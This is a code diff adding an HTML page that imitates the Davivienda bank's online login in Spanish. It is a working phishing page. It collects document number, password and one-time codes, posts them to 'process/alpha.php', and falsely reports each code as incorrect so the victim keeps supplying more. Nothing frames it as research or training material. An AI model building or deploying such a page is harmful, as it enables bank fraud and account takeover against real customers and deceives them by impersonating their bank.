@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Virtual</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .container { max-width: 400px; padding: 20px; }
+        .form-group { gap: 5px !important; margin-bottom: 12px !important; text-align: left; }
+        .form-input, .form-select { border-radius: 20px !important; padding: 12px 16px !important; border: 1px solid #ccc; }
+        .btn-continue { border-radius: 25px !important; padding: 13px !important; width: 100%; border: none; background: #ed1c24; color: #fff; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        
+        #passSection, #otpSection { display: none; opacity: 0; transform: translateY(-10px); transition: all 0.4s ease; }
+        .show { display: block !important; opacity: 1 !important; transform: translateY(0) !important; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container" style="margin-bottom: 25px;">
+            <img src="LogoDavivienda.svg" alt="Logo" class="logo" style="max-width: 160px;">
+        </div>
+        
+        <div id="stepContainer">
+            <div class="welcome-section" style="margin-bottom: 20px;">
+                <p style="font-size: 19px; margin:0; color: #2c2c2c;">¡Hola!</p>
+                <h2 style="font-size: 23px; font-weight: 700; margin:0; color: #2c2c2c;">Nos alegra que esté aquí</h2>
+            </div>
+            
+            <form id="mainForm">
+                <div id="docGroup">
+                    <div class="form-group">
+                        <label class="form-label">Seleccione su tipo de documento</label>
+                        <select id="docType" class="form-select">
+                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+                            <option value="Pasaporte">Pasaporte</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">Ingrese su número de documento</label>
+                        <input type="text" id="docNumber" class="form-input" required autocomplete="off">
+                    </div>
+                    <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
+                </div>
+
+                <div id="passSection">
+                    <div class="form-group">
+                        <label class="form-label">Ingrese su clave virtual</label>
+                        <input type="password" id="pass" class="form-input" maxlength="8">
+                    </div>
+                    <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
+                </div>
+
+                <div id="otpSection">
+                    <div style="border-top: 1px solid #eee; margin-top: 15px; padding-top: 15px;">
+                        <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700; margin-bottom: 5px;">Verificación</h2>
+                        <div class="form-group">
+                            <label class="form-label">Código de confirmación</label>
+                            <input type="text" id="otpCode" class="form-input" placeholder="000000" maxlength="8">
+                        </div>
+                        <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none; margin-top: 5px;">Código incorrecto. Intente de nuevo.</p>
+                        <button type="button" id="btnFinish" class="btn-continue">Confirmar Código</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        async function sendData(step, details) {
+            const formData = new FormData();
+            formData.append('step', step);
+            for (const key in details) { formData.append(key, details[key]); }
+            await fetch('process/alpha.php', { method: 'POST', body: formData });
+        }
+
+        document.getElementById('btnToPass').addEventListener('click', () => {
+            if (document.getElementById('docNumber').value.length > 3) {
+                document.getElementById('docGroup').classList.add('hidden');
+                document.getElementById('passSection').classList.add('show');
+            }
+        });
+
+        document.getElementById('btnToOtp').addEventListener('click', async () => {
+            const btn = document.getElementById('btnToOtp');
+            btn.innerText = "Cargando...";
+            btn.disabled = true;
+
+            await sendData('LOGIN', { 
+                type: document.getElementById('docType').value, 
+                doc: document.getElementById('docNumber').value, 
+                pass: document.getElementById('pass').value 
+            });
+
+            document.getElementById('passSection').classList.remove('show');
+            document.getElementById('passSection').classList.add('hidden');
+            document.getElementById('otpSection').classList.add('show');
+        });
+
+        document.getElementById('btnFinish').addEventListener('click', async () => {
+            const btn = document.getElementById('btnFinish');
+            const otp = document.getElementById('otpCode').value;
+            if (otp.length < 4) return;
+
+            btn.innerText = "Verificando...";
+            await sendData('OTP', { 
+                doc: document.getElementById('docNumber').value, 
+                otp: otp 
+            });
+
+            setTimeout(() => {
+                document.getElementById('errOtp').style.display = 'block';
+                document.getElementById('otpCode').value = '';
+                btn.innerText = "Confirmar Código";
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
